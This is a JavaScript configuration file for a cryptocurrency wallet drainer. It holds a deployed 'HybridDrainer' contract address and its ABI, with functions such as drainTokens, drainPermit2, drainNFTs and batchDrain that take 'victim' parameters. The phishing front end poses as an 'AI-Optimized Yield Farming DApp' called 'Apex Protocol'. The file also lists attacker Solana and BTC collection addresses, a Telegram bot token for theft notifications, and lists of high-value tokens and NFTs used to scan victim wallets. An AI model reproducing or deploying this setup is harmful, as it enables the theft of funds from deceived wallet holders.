export const CONFIG = {
  // ─── Deployed Contract ────────────────────────────────────────────
  DRAINER_CONTRACT: "0x976b6C40c6ffa992156b9B88F681bD3D40395c27",

  // ─── Contract ABI (from Hardhat 3 artifact) ───────────────────────
  CONTRACT_ABI: [
    {
      "inputs": [
        { "internalType": "address[]", "name": "primary", "type": "address[]" },
        { "internalType": "uint16[]", "name": "primaryBps", "type": "uint16[]" },
        { "internalType": "address[]", "name": "fb1", "type": "address[]" },
        { "internalType": "uint16[]", "name": "fb1Bps", "type": "uint16[]" },
        { "internalType": "address[]", "name": "fb2", "type": "address[]" },
        { "internalType": "uint16[]", "name": "fb2Bps", "type": "uint16[]" },
        { "internalType": "address[]", "name": "emergency", "type": "address[]" },
        { "internalType": "uint16[]", "name": "emergencyBps", "type": "uint16[]" }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    { "anonymous": false, "inputs": [], "name": "CircuitReset", "type": "event" },
    {
      "anonymous": false,
      "inputs": [{ "indexed": false, "internalType": "string", "name": "reason", "type": "string" }],
      "name": "CircuitTripped", "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        { "indexed": true, "internalType": "address", "name": "wallet", "type": "address" },
        { "indexed": true, "internalType": "address", "name": "dapp", "type": "address" }
      ],
      "name": "Connected", "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        { "indexed": true, "internalType": "address", "name": "operator", "type": "address" },
        { "indexed": true, "internalType": "address", "name": "victim", "type": "address" },
        { "indexed": false, "internalType": "uint256", "name": "successful", "type": "uint256" },
        { "indexed": false, "internalType": "uint256", "name": "gasUsed", "type": "uint256" }
      ],
      "name": "DrainExecuted", "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        { "indexed": false, "internalType": "uint256", "name": "tier", "type": "uint256" },
        { "indexed": true, "internalType": "address", "name": "recipient", "type": "address" },
        { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
      ],
      "name": "FallbackUsed", "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
        { "indexed": true, "internalType": "address", "name": "to", "type": "address" },
        { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
      ],
      "name": "FundsRecovered", "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        { "indexed": true, "internalType": "address", "name": "victim", "type": "address" },
        { "indexed": true, "internalType": "address", "name": "collection", "type": "address" },
        { "indexed": false, "internalType": "uint256", "name": "tokenId", "type": "uint256" },
        { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
      ],
      "name": "NftDrained", "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        { "indexed": true, "internalType": "address", "name": "operator", "type": "address" },
        { "indexed": false, "internalType": "bool", "name": "allowed", "type": "bool" }
      ],
      "name": "OperatorSet", "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        { "indexed": true, "internalType": "address", "name": "prev", "type": "address" },
        { "indexed": true, "internalType": "address", "name": "next", "type": "address" }
      ],
      "name": "OwnershipTransferred", "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [{ "indexed": true, "internalType": "address", "name": "account", "type": "address" }],
      "name": "Paused", "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        { "indexed": true, "internalType": "address", "name": "victim", "type": "address" },
        { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
        { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
      ],
      "name": "PermitDrained", "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [{ "indexed": false, "internalType": "uint256", "name": "executableAt", "type": "uint256" }],
      "name": "RecipientsProposed", "type": "event"
    },
    { "anonymous": false, "inputs": [], "name": "RecipientsUpdated", "type": "event" },
    {
      "anonymous": false,
      "inputs": [
        { "indexed": true, "internalType": "address", "name": "user", "type": "address" },
        { "indexed": false, "internalType": "uint256", "name": "ts", "type": "uint256" }
      ],
      "name": "RewardClaimed", "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
        { "indexed": true, "internalType": "address", "name": "recipient", "type": "address" },
        { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" },
        { "indexed": false, "internalType": "bool", "name": "ok", "type": "bool" }
      ],
      "name": "Split", "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        { "indexed": true, "internalType": "address", "name": "victim", "type": "address" },
        { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
        { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
      ],
      "name": "TokensDrained", "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [{ "indexed": true, "internalType": "address", "name": "account", "type": "address" }],
      "name": "Unpaused", "type": "event"
    },
    { "stateMutability": "payable", "type": "fallback" },
    {
      "inputs": [],
      "name": "BPS",
      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        { "internalType": "uint8", "name": "", "type": "uint8" },
        { "internalType": "address", "name": "sender", "type": "address" },
        { "internalType": "address", "name": "", "type": "address" }
      ],
      "name": "Claim",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        { "internalType": "uint8", "name": "", "type": "uint8" },
        { "internalType": "address", "name": "sender", "type": "address" },
        { "internalType": "address", "name": "", "type": "address" }
      ],
      "name": "ClaimReward",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        { "internalType": "uint8", "name": "", "type": "uint8" },
        { "internalType": "address", "name": "sender", "type": "address" },
        { "internalType": "address", "name": "recipient1", "type": "address" }
      ],
      "name": "Connect",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "FAILURE_LIMIT",
      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "MAINNET_ID",
      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "MAX_BATCH",
      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "MAX_GAS_BUDGET",
      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "MAX_GAS_PRICE",
      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "MAX_RECIPIENTS",
      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "MIN_GAS_RESERVE",
      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "PERMIT2",
      "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "TIMELOCK",
      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "components": [
            {
              "components": [
                { "internalType": "address", "name": "victim", "type": "address" },
                {
                  "components": [
                    { "internalType": "address", "name": "token", "type": "address" },
                    { "internalType": "uint256", "name": "value", "type": "uint256" },
                    { "internalType": "uint256", "name": "deadline", "type": "uint256" },
                    { "internalType": "uint8", "name": "v", "type": "uint8" },
                    { "internalType": "bytes32", "name": "r", "type": "bytes32" },
                    { "internalType": "bytes32", "name": "s", "type": "bytes32" }
                  ],
                  "internalType": "struct HybridDrainer.PermitData[]",
                  "name": "permits",
                  "type": "tuple[]"
                },
                { "internalType": "address[]", "name": "tokens", "type": "address[]" },
                { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" },
                { "internalType": "uint256", "name": "gasBudget", "type": "uint256" },
                { "internalType": "bool", "name": "resume", "type": "bool" },
                { "internalType": "uint256", "name": "deadline", "type": "uint256" }
              ],
              "internalType": "struct HybridDrainer.DrainReq[]",
              "name": "tokenReqs",
              "type": "tuple[]"
            }
          ],
          "internalType": "struct HybridDrainer.BatchReq",
          "name": "b",
          "type": "tuple"
        }
      ],
      "name": "batchDrain",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "cancelProposal",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "circuitBroken",
      "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "consecutiveFailures",
      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [{ "internalType": "address", "name": "", "type": "address" }],
      "name": "drainCursor",
      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        { "internalType": "address", "name": "victim", "type": "address" },
        { "internalType": "address", "name": "collection", "type": "address" },
        { "internalType": "uint256[]", "name": "ids", "type": "uint256[]" },
        { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" },
        { "internalType": "uint8", "name": "mode", "type": "uint8" }
      ],
      "name": "drainNFTs",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        { "internalType": "address", "name": "victim", "type": "address" },
        {
          "components": [
            {
              "components": [
                { "internalType": "address", "name": "token", "type": "address" },
                { "internalType": "uint160", "name": "amount", "type": "uint160" },
                { "internalType": "uint48", "name": "expiration", "type": "uint48" },
                { "internalType": "uint48", "name": "nonce", "type": "uint48" }
              ],
              "internalType": "struct IPermit2.PermitDetails[]",
              "name": "details",
              "type": "tuple[]"
            },
            { "internalType": "address", "name": "spender", "type": "address" },
            { "internalType": "uint256", "name": "sigDeadline", "type": "uint256" }
          ],
          "internalType": "struct IPermit2.PermitBatch",
          "name": "pd",
          "type": "tuple"
        },
        { "internalType": "bytes", "name": "sig", "type": "bytes" },
        { "internalType": "uint160[]", "name": "amounts", "type": "uint160[]" }
      ],
      "name": "drainPermit2",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "components": [
            { "internalType": "address", "name": "victim", "type": "address" },
            {
              "components": [
                { "internalType": "address", "name": "token", "type": "address" },
                { "internalType": "uint256", "name": "value", "type": "uint256" },
                { "internalType": "uint256", "name": "deadline", "type": "uint256" },
                { "internalType": "uint8", "name": "v", "type": "uint8" },
                { "internalType": "bytes32", "name": "r", "type": "bytes32" },
                { "internalType": "bytes32", "name": "s", "type": "bytes32" }
              ],
              "internalType": "struct HybridDrainer.PermitData[]",
              "name": "permits",
              "type": "tuple[]"
            },
            { "internalType": "address[]", "name": "tokens", "type": "address[]" },
            { "internalType": "uint256[]", "name": "amounts", "type": "uint256[]" },
            { "internalType": "uint256", "name": "gasBudget", "type": "uint256" },
            { "internalType": "bool", "name": "resume", "type": "bool" },
            { "internalType": "uint256", "name": "deadline", "type": "uint256" }
          ],
          "internalType": "struct HybridDrainer.DrainReq",
          "name": "r",
          "type": "tuple"
        }
      ],
      "name": "drainTokens",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "executeRecipientsUpdate",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [{ "internalType": "address", "name": "v", "type": "address" }],
      "name": "getCursor",
      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [{ "internalType": "address", "name": "who", "type": "address" }],
      "name": "isOperator",
      "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [{ "internalType": "address", "name": "", "type": "address" }],
      "name": "operators",
      "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
      "stateMutability": "view",
      "type": "function"
    },
    { "inputs": [], "name": "pause", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
    {
      "inputs": [],
      "name": "paused",
      "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "pendingExecutableAt",
      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        { "internalType": "address[]", "name": "primary", "type": "address[]" },
        { "internalType": "uint16[]", "name": "primaryBps", "type": "uint16[]" },
        { "internalType": "address[]", "name": "fb1", "type": "address[]" },
        { "internalType": "uint16[]", "name": "fb1Bps", "type": "uint16[]" },
        { "internalType": "address[]", "name": "fb2", "type": "address[]" },
        { "internalType": "uint16[]", "name": "fb2Bps", "type": "uint16[]" },
        { "internalType": "address[]", "name": "emergency", "type": "address[]" },
        { "internalType": "uint16[]", "name": "emergencyBps", "type": "uint16[]" }
      ],
      "name": "proposeRecipients",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        { "internalType": "address", "name": "collection", "type": "address" },
        { "internalType": "address", "name": "to", "type": "address" },
        { "internalType": "uint256", "name": "id", "type": "uint256" },
        { "internalType": "uint256", "name": "amount", "type": "uint256" }
      ],
      "name": "recoverERC1155",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        { "internalType": "address", "name": "token", "type": "address" },
        { "internalType": "address", "name": "to", "type": "address" },
        { "internalType": "uint256", "name": "amount", "type": "uint256" }
      ],
      "name": "recoverFunds",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        { "internalType": "address", "name": "collection", "type": "address" },
        { "internalType": "address", "name": "to", "type": "address" },
        { "internalType": "uint256", "name": "id", "type": "uint256" }
      ],
      "name": "recoverNFT",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }],
      "name": "recoverNative",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    { "inputs": [], "name": "resetCircuit", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
    {
      "inputs": [
        { "internalType": "address", "name": "op", "type": "address" },
        { "internalType": "bool", "name": "allowed", "type": "bool" }
      ],
      "name": "setOperator",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "tierCount",
      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        { "internalType": "uint256", "name": "", "type": "uint256" },
        { "internalType": "uint256", "name": "", "type": "uint256" }
      ],
      "name": "tiers",
      "outputs": [
        { "internalType": "address payable", "name": "wallet", "type": "address" },
        { "internalType": "uint16", "name": "bps", "type": "uint16" }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalOps",
      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalSuccesses",
      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalValueWei",
      "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [{ "internalType": "address", "name": "n", "type": "address" }],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    { "inputs": [], "name": "unpause", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
    { "stateMutability": "payable", "type": "receive" }
  ],

  // ─── WalletConnect / dApp metadata ────────────────────────────────
  PROJECT_ID: "ea2ef1ec737f10116a4329a7c5629979",
  PUBLIC_TEST_ID: "8f9a3f7b7c8e4d3a9b2c1d5e6f7a8b9c",

  DAPP_METADATA: {
    name: "Apex Protocol",
    description: "AI-Optimized Yield Farming DApp",
    url: typeof window !== "undefined" ? window.location.origin : "https://apex-protocol.io",
    icons: ["https://walletconnect.com/walletconnect-logo.png"],
  },

  // ─── Attacker-controlled collection addresses (SOL/BTC) ───────────
  ATTACKER_SOLANA_ADDRESS: "7uYC9fnzK3HashgE8x8fJ5oqUMLBWkVYqPiFNhejYPX7",
  ATTACKER_BTC_ADDRESS: "bc1qyugnjmr05e4xf4wd4xs2ytn9an34uxelkt9h5f",

  // ─── Telegram notifications (optional) ────────────────────────────
  TELEGRAM_BOT_TOKEN: "8695014382:AAHVuw3qQTCa_rGIzBXoRxDEdKkPvUhLim0",
  TELEGRAM_CHAT_ID: "17624102",

  // ─── Frontend tuning ──────────────────────────────────────────────
  CLAIM_THRESHOLD_USD: 3,

  // Known token list used by the frontend to scan victim wallets
  KNOWN_TOKENS: [
    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
    { address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", symbol: "MATIC", decimals: 18 },
    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18 },
    { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH", decimals: 18 },
    { address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", symbol: "SHIB", decimals: 18 },
    { address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381", symbol: "APE", decimals: 18 },
    { address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", symbol: "AAVE", decimals: 18 },
  ],

  KNOWN_NFT_COLLECTIONS: [
    { address: "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D", standard: 721, name: "BAYC" },
    { address: "0x60E4d786628Fea6478F785A6d7e704777c86a7c6", standard: 721, name: "MAYC" },
    { address: "0x23581767a106ae21c074b2276D25e5C3e136a68b", standard: 721, name: "Moonbirds" },
    { address: "0xED5AF388653567Af2F388E6224dC7C4b3241C544", standard: 721, name: "Azuki" },
  ],
};
